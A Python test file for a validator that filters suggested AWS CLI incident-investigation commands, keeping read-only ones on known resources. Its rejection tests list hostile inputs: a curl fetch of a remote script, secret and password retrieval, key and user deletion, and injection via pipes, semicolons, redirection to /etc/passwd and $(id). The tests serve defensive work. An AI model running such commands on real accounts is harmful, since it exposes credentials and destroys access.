from logsight import checks as C

PAYLOAD = {"incidents": [{"id": "INC-001", "actors": ["web_admin"], "src_ips": ["198.51.100.7"],
                          "instances": ["i-0a1b2c3d4e5f60718"],
                          "events": [{"ref": "ct:1", "resource": "frothlybucket"}]}]}


def run(cmd, about="키가 어디서 새었는지 모름"):
    kept, rep = C.validate_checks([{"about": about, "command": cmd, "purpose": "p"}], PAYLOAD)
    return kept, rep


def test_read_only_command_with_known_resources_is_kept():
    for cmd in [
        "aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=web_admin",
        "aws iam list-access-keys --user-name web_admin",
        "aws s3api get-bucket-policy --bucket frothlybucket",
        "aws ec2 describe-instances --instance-ids i-0a1b2c3d4e5f60718 --region us-west-2 --output json",
        "aws cloudtrail lookup-events --start-time 2018-08-20T09:00:00Z --max-results 50",
        # 이벤트 이름은 자원이 아니다(BOTSv3 실측에서 잘못 버리던 것)
        "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=PutBucketAcl",
    ]:
        kept, rep = run(cmd)
        assert len(kept) == 1, (cmd, rep)


def test_write_or_secret_commands_are_dropped():
    for cmd in [
        "aws iam delete-access-key --user-name web_admin --access-key-id AKIAXXXXXXXXXXXXXXXX",
        "aws iam update-access-key --user-name web_admin --status Inactive",
        "aws secretsmanager get-secret-value --secret-id prod",
        "aws s3api get-object --bucket frothlybucket --key a.txt out.txt",
        "aws ec2 get-password-data --instance-id i-0a1b2c3d4e5f60718",
        "curl http://198.51.100.7/x.sh",
    ]:
        kept, rep = run(cmd)
        assert kept == [] and rep["dropped"], cmd


def test_shell_tricks_are_dropped():
    for cmd in [
        "aws iam list-users | sh",
        "aws iam list-users; aws iam delete-user --user-name web_admin",
        "aws iam list-users > /etc/passwd",
        "aws iam list-users --query $(id)",
    ]:
        kept, _ = run(cmd)
        assert kept == [], cmd


def test_resources_not_in_input_are_dropped():
    for cmd in [
        "aws s3api get-bucket-acl --bucket made-up-bucket",
        "aws iam list-access-keys --user-name someone_else",
        "aws ec2 describe-instances --instance-ids i-0fffffffffffffff0",
        "aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=ghost",
        "aws ec2 describe-flow-logs --filter Name=x,Values=10.9.9.9",
    ]:
        kept, rep = run(cmd)
        assert kept == [] and "사건 입력에 없는 자원" in rep["dropped"][0]["reason"], (cmd, rep)


def test_missing_about_duplicates_and_limit():
    cmd = "aws iam list-users"
    kept, rep = C.validate_checks([{"about": "", "command": cmd, "purpose": ""}], PAYLOAD)
    assert kept == []
    kept, rep = C.validate_checks([{"about": "a", "command": cmd, "purpose": ""}] * 2, PAYLOAD)
    assert len(kept) == 1 and rep["dropped"][0]["reason"] == "같은 명령 반복"
    many = [{"about": "a", "command": f"aws iam list-users --max-items {i}", "purpose": ""} for i in range(15)]
    kept, rep = C.validate_checks(many, PAYLOAD)
    assert len(kept) == C.MAX_CHECKS and rep["over_limit"] == 5
